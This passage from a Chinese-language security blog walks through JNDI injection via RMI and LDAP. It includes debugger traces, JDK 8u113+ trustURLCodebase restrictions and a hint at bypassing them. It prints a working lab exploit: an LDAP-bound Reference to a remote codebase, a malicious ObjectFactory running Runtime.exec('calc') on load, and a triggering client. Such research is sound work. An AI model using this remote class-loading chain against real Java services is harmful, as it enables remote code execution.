data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710062980334-565914fe-1242-4f5c-8072-ca56e21d6693.png#averageHue=%23353c44&clientId=u632663d2-e5d7-4&from=paste&height=234&id=u392db9b7&originHeight=351&originWidth=933&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=207194&status=done&style=none&taskId=u726564fe-9b34-4afa-b0f6-fd6cc949d9e&title=&width=622" referrerpolicy="no-referrer" alt="image.png"><br>那么之后就是根据工厂类来获取 rmiURLContext 的内容了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710063051233-69c5f2b1-9d3c-409d-b3e9-a1ba8d973a0e.png#averageHue=%23494f5b&clientId=u632663d2-e5d7-4&from=paste&height=353&id=uf50628d8&originHeight=529&originWidth=1742&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=386353&status=done&style=none&taskId=u1008e49c-bf24-4a57-bb86-2fd34043011&title=&width=1161.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>这里就直接返回 rmiURLContext，到调用 lookup 中去<br>还是由于 rmiURLContext 本身没有 lookup 方法的定义，跟进到 GenericURLContext 的 lookup 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710063367421-7153a436-120f-4d6d-9a6d-27dab9e1638d.png#averageHue=%23414955&clientId=u632663d2-e5d7-4&from=paste&height=648&id=u6da1f32b&originHeight=972&originWidth=1662&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=765667&status=done&style=none&taskId=u655cbf5a-b149-418b-963b-40a53696595&title=&width=1108" referrerpolicy="no-referrer" alt="image.png"><br>这里的getRootURLContext 方法和getResolvedObj 方法都都是为了获取 RegistryContext<br>此时的 var3 就是RegistryContext，继续调用其 lookup 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710063474248-a50294d7-5e08-4070-80ac-912eafd3c484.png#averageHue=%23464c57&clientId=u632663d2-e5d7-4&from=paste&height=349&id=ua30ce734&originHeight=524&originWidth=1404&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=325269&status=done&style=none&taskId=u8edc569e-1e54-4728-9a1f-23eb80255ce&title=&width=936" referrerpolicy="no-referrer" alt="image.png"><br>到这里就已经获取到了 RMI 中熟悉的 Stub，从远程客户端上请求字节码了，最后调用 decodeObeject 进行实例化<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710063545706-c3d5d128-3321-457a-b8da-b5a4af365d5b.png#averageHue=%23454c58&clientId=u632663d2-e5d7-4&from=paste&height=311&id=ucaaa39e9&originHeight=467&originWidth=1977&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=392441&status=done&style=none&taskId=u40daf98b-4543-4082-b8a2-f8a4f630d64&title=&width=1318" referrerpolicy="no-referrer" alt="image.png"><br>这里持续跟进到 getObjectFactoryFromReference<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710063671734-a0f4f4f9-6334-4c1b-a3be-3c68bb735811.png#averageHue=%23494f5b&clientId=u632663d2-e5d7-4&from=paste&height=293&id=udb4df194&originHeight=440&originWidth=1815&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=330395&status=done&style=none&taskId=u44716f8c-8312-408d-88fe-5227816a9eb&title=&width=1210" referrerpolicy="no-referrer" alt="image.png"><br>调用 loadClass 进行动态类加载<br>与之前 JNDI 实例化 initialContext 时不同，iinitialContext 的 factory 类不是在这里实例化（虽然长得挺像的），而是在NamingManager 的 getInitialContext，至于这里的逻辑就是区别在getURLOrDefaultInitCtx 里面了，看是走 URLCtx 还是 DefaultCtx</p>
<h2 id="0x02-踩坑实录"><a href="#0x02-踩坑实录" class="headerlink" title="0x02 踩坑实录"></a>0x02 踩坑实录</h2><p>愚蠢的 stoocea 又在这里踩坑了，目录结构尽量是直接在 java 目录下，不要在子包下写服务<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710060698734-e6225a8a-b378-4575-b710-588627598dbe.png#averageHue=%23333f47&clientId=u632663d2-e5d7-4&from=paste&height=223&id=u5f4c223f&originHeight=334&originWidth=495&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=57658&status=done&style=none&taskId=u8c6727c7-9025-4aa7-94de-1c8c4261305&title=&width=330" referrerpolicy="no-referrer" alt="image.png"><br>不然客户端启动的时候找不到 RMIHello 这个恶意类（我也不知道为什么，可能寻找的地址 String 要加点什么吧）</p>
<h2 id="0x03-JNDI-LDAP"><a href="#0x03-JNDI-LDAP" class="headerlink" title="0x03 JNDI+LDAP"></a>0x03 JNDI+LDAP</h2><h3 id="0x01-什么是-LDAP"><a href="#0x01-什么是-LDAP" class="headerlink" title="0x01 什么是 LDAP"></a>0x01 什么是 LDAP</h3><p>首先回顾一下 LDAP 的定义（ Lightweight Directory Access Protocol ，轻型目录访问协议  ），是一种目录服务协议，运行在 TCP&#x2F;IP 堆栈上。它本身是由目录数据库和一套的目录访问协议构成的，目录服务本身是一个特殊的数据库，用来保存描述性的，基于属性的详细信息，拥有最基本的查询，浏览，以树状结构组织数据<br>简单点说，LDAP 就是一个用来存储协议的数据库<br>在 LDAP 中我们通过目录树来访问一条记录，基本名词和结构如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">dn ：一条记录的详细位置

dc ：一条记录所属区域    <span class="token punctuation">(</span>哪一颗树<span class="token punctuation">)</span>

ou ：一条记录所属组织    （哪一个分支）

cn<span class="token operator">/</span>uid：一条记录的名字<span class="token operator">/</span><span class="token constant">ID</span>   <span class="token punctuation">(</span>哪一个苹果名字<span class="token punctuation">)</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

<span class="token constant">LDAP</span>目录树的最顶部就是根，也就是所谓的“基准<span class="token constant">DN</span>"。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>访问的深度依次从上往下<br>JNDI 的工作流程是不会变的，如果我们可以控制 JNDI 去访问 LDAP 服务器上的恶意对象，就能够达到和 恶意 RMI 对象同样的效果</p>
<h3 id="0x02-JNDI-LDAP-攻击实现"><a href="#0x02-JNDI-LDAP-攻击实现" class="headerlink" title="0x02 JNDI+LDAP 攻击实现"></a>0x02 JNDI+LDAP 攻击实现</h3><p>先用 windows 上常用的 LDAP 服务器把 LDAP 服务搭上，这里我用是 apache LDAP	,首先 new 一个新的 LDAP 服务，然后在这个 LDAP 服务的基础上加上 LDAP 连接，目录结构如下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710070803294-b6d94bda-c880-42ac-81a3-1422ac72fc68.png#averageHue=%23f6f5f5&clientId=uad2256d1-92e8-4&from=paste&height=469&id=u070e807d&originHeight=704&originWidth=2559&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=125506&status=done&style=none&taskId=u706651e4-d8e4-4d9f-9a74-e24e60cd494&title=&width=1706" referrerpolicy="no-referrer" alt="image.png"><br>之后开始 JNDI 作用 LDAP 的代码实现<br>先写一个服务端（针对 LDAP 了，所以不用去加 ReferenceWrapper 去包装满足 RMI 的要求了）</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Reference</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Naming</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JNDI_LDAP_Server</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">InitialContext</span> initialContext<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Reference</span> refObj<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"RMIHello"</span><span class="token punctuation">,</span><span class="token string">"RMIHello"</span><span class="token punctuation">,</span><span class="token string">"http://localhost:8000/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        initialContext<span class="token punctuation">.</span><span class="token function">rebind</span><span class="token punctuation">(</span><span class="token string">"ldap://localhost:10389/cn=TestLdap,dc=example,dc=com"</span><span class="token punctuation">,</span>refObj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"LDAP服务器正在运行中"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后要注意恶意类的编写有所改变，不是针对 RMI 形式的攻击了，这里的是 LDAP，所以不用去继承 UnicastRef</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Name</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>spi<span class="token punctuation">.</span></span><span class="token class-name">ObjectFactory</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span><span class="token class-name">UnicastRemoteObject</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span>



<span class="token comment">//远程工厂类</span>
<span class="token comment">//如果是测试RMI-JNDI的攻击，请加上UnicastServerRefObject的继承</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIHello</span>  <span class="token keyword">implements</span> <span class="token class-name">ObjectFactory</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token class-name">RMIHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span> <span class="token punctuation">&#123;</span>


        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>

            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">&#125;</span>

    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getObjectInstance</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">Name</span> name<span class="token punctuation">,</span> <span class="token class-name">Context</span> nameCtx<span class="token punctuation">,</span> <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">></span></span> environment<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后是客户端：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JNDI_LDAP_Dynamic</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> string <span class="token operator">=</span> <span class="token string">"ldap://localhost:10389/cn=TestLdap,dc=example,dc=com"</span><span class="token punctuation">;</span>

        <span class="token class-name">InitialContext</span> initialContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        initialContext<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>实验没问题<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710070919465-19258383-2340-4a80-b2f0-a54d8eb5d7ab.png#averageHue=%233b454e&clientId=uad2256d1-92e8-4&from=paste&height=600&id=u7a3871d2&originHeight=900&originWidth=2096&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=532532&status=done&style=none&taskId=u62723e86-3d9a-459b-a6c1-03bc7bdb05b&title=&width=1397.3333333333333" referrerpolicy="no-referrer" alt="image.png"></p>
<h4 id="1x01-攻击流程分析"><a href="#1x01-攻击流程分析" class="headerlink" title="1x01 攻击流程分析"></a>1x01 攻击流程分析</h4><p>其实整体和 RMI 很相似，只不过初步获取 Context 不同<br>这里我们依然断点打在 lookup 处<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710071058356-c2c295c2-db7f-4659-981e-0c67f89e8acd.png#averageHue=%23494e5a&clientId=uad2256d1-92e8-4&from=paste&height=271&id=u87908237&originHeight=407&originWidth=1901&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=310136&status=done&style=none&taskId=u4feb1297-bf5b-480d-9859-4f3af19dd96&title=&width=1267.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>直接进 initialContext 的 lookup，先获取 context<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710071131051-100276ea-3344-4d51-b632-a19ff2bc042e.png#averageHue=%23474d59&clientId=uad2256d1-92e8-4&from=paste&height=340&id=u9d94d7de&originHeight=510&originWidth=1751&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=389090&status=done&style=none&taskId=u628d085e-31d9-4bff-882d-ec28f69e7a2&title=&width=1167.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>之后返回出去开始调用 ldapURLContext 的 lookup 方法，跟进之后发现还是跟 RMIURLcontext 差不多，调用父类 GenericContext 的 lookup 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710071198229-57bc7af5-6bbe-44d3-867d-5562301ed5bf.png#averageHue=%234f5462&clientId=uad2256d1-92e8-4&from=paste&height=196&id=u8ee46423&originHeight=294&originWidth=1820&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=216592&status=done&style=none&taskId=u36a5fe8f-1d4a-4770-a431-e1f051d483a&title=&width=1213.3333333333333" referrerpolicy="no-referrer" alt="image.png"></p>
<p>前面获取解析结果 ldapCtx 就不跟进了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710071268093-eb1c57f1-2c7a-4f5b-a11f-f71aee626bb8.png#averageHue=%23484e5a&clientId=uad2256d1-92e8-4&from=paste&height=338&id=u21e67fc8&originHeight=507&originWidth=1795&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=390701&status=done&style=none&taskId=u67da0f43-b9c0-4028-9c13-40dd3a97f4f&title=&width=1196.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>直接进它的 lookup<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710071458532-82346718-0253-4c35-8f3a-bd9368e00235.png#averageHue=%233e454f&clientId=uad2256d1-92e8-4&from=paste&height=349&id=ue55d6791&originHeight=524&originWidth=1863&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=424984&status=done&style=none&taskId=u50de15cf-7e09-40fb-889b-c1a06019e43&title=&width=1242" referrerpolicy="no-referrer" alt="image.png"><br>但是 ldapCtx 本身是没有 lookup 方法，还是得调它的父类（这里直接掉到了顶级父类）PartialCompositeContext 的 lookup 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710071601329-0c5a909c-2f35-44a3-9e7e-69758eb89918.png#averageHue=%233d454f&clientId=uad2256d1-92e8-4&from=paste&height=356&id=u13c50132&originHeight=534&originWidth=1991&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=449304&status=done&style=none&taskId=u06ec767f-bc3f-473e-b784-4290ba647b1&title=&width=1327.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>获取一堆信息，然后直接进 try，跟进 p_lookup<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710071638706-df7c75fc-7232-4b59-96cc-108f8aa365d0.png#averageHue=%233d444e&clientId=uad2256d1-92e8-4&from=paste&height=386&id=u2d8fcc5f&originHeight=579&originWidth=2076&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=484265&status=done&style=none&taskId=uf1c3be4c-9af3-472f-824a-ff1b1f192ab&title=&width=1384" referrerpolicy="no-referrer" alt="image.png"><br>最后又一直向下调用 ComponentContext 的 c_lookup<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710071723681-ab205012-bdb2-446b-941b-2fd1f6fcfd61.png#averageHue=%233d454f&clientId=uad2256d1-92e8-4&from=paste&height=336&id=u122b2ae0&originHeight=504&originWidth=2023&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=400987&status=done&style=none&taskId=u72ee599f-6d7a-4d85-8acf-1429ba6b423&title=&width=1348.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>跟进到最后熟悉的 DirectoryManager 的 getObjectInstance 了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710071661410-a83c6be9-8f5a-4cf5-a667-e59606ac1a51.png#averageHue=%23474e5b&clientId=uad2256d1-92e8-4&from=paste&height=290&id=u1eb4fda0&originHeight=435&originWidth=2163&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=366601&status=done&style=none&taskId=ub0e6ebdf-d1f4-4567-9a76-416f72d3998&title=&width=1442" referrerpolicy="no-referrer" alt="image.png"><br>getObjectInstance 中跟进到 getObjectFactoryFromReference<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710073730270-d54002ce-5a16-4067-be1a-5229e83e0555.png#averageHue=%233d444d&clientId=ufd46421e-3273-4&from=paste&height=403&id=uc2822095&originHeight=605&originWidth=1325&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=323398&status=done&style=none&taskId=u411e3294-78ec-49e6-a950-221a0586092&title=&width=883.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>之后就是动态类加载了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710074151159-461a15d5-d65c-4b1a-8e26-aeeaf39880be.png#averageHue=%233c424b&clientId=ufd46421e-3273-4&from=paste&height=324&id=u3050fcb1&originHeight=486&originWidth=1157&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=225130&status=done&style=none&taskId=u8d4864a7-0c7a-4eda-bfeb-9d7d17d1c17&title=&width=771.3333333333334" referrerpolicy="no-referrer" alt="image.png"></p>
<h2 id="JNDI-注入高版本绕过"><a href="#JNDI-注入高版本绕过" class="headerlink" title="JNDI 注入高版本绕过"></a>JNDI 注入高版本绕过</h2><h3 id="0x01-JNDI-RMI-限制"><a href="#0x01-JNDI-RMI-限制" class="headerlink" title="0x01 JNDI-RMI 限制"></a>0x01 JNDI-RMI 限制</h3><p>JDK 6u132, JDK 7u122, JDK 8u113之后Java限制了通过RMI远程加载Reference工厂类。<br>估计师傅们自己在测试的时候应该也遇到了这个问题，也就是报错<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710074773573-de02eea7-6076-4ef1-96ae-5ccda0164839.png#averageHue=%233a414a&clientId=ufd46421e-3273-4&from=paste&height=37&id=ucc526e2e&originHeight=55&originWidth=1771&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=59803&status=done&style=none&taskId=u585743a5-06f2-437b-ab09-d68bb6c3c1e&title=&width=1180.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为了false，即默认不允许通过RMI从远程的Codebase加载Reference工厂类。</p>
<h4 id="1x01-源码分析"><a href="#1x01-源码分析" class="headerlink" title="1x01 源码分析"></a>1x01 源码分析</h4><p>相信经过上面的攻击流程分析，师傅们应该可以确定，JNDI-RMI 的远程攻击进入开始阶段是在<code>RegistryContext#decodeObject()</code>中<br>对比 8u65 和 8u202 的源码不同</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710075083827-b41f01c2-b3f3-4ff2-9f8e-e3d06cd468ed.png#averageHue=%233c444d&clientId=ufd46421e-3273-4&from=paste&height=373&id=QOQi4&originHeight=559&originWidth=1715&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=419213&status=done&style=none&taskId=u40670ce5-2e97-4c05-a3cc-d4018f964fc&title=&width=1143.3333333333333" referrerpolicy="no-referrer" alt="image.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710075061235-86de9153-2e0c-40bd-90dd-e8ea109cc24d.png#averageHue=%233c434c&clientId=ufd46421e-3273-4&from=paste&height=332&id=p3Luk&originHeight=498&originWidth=2120&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=430563&status=done&style=none&taskId=u3701d801-4fe8-4b7c-9270-cb23be77c27&title=&width=1413.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>多了一层对于类型的限制以及远程 trustURLCodebase 的检查，基本上远程 codebase 都不会被允许加载了，所以我们得另辟蹊径，首先加载本地的 factory，然后再利用这个本地的 factory 去加载远程类</p>
<h3 id="0x02-JNDI-LDAP-限制"><a href="#0x02-JNDI-LDAP-限制" class="headerlink" title="0x02 JNDI-LDAP 限制"></a>0x02 JNDI-LDAP 限制</h3><p>同样包下的 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>也被默认值设置为了 false，限制相同，绕过方式也相同</p>
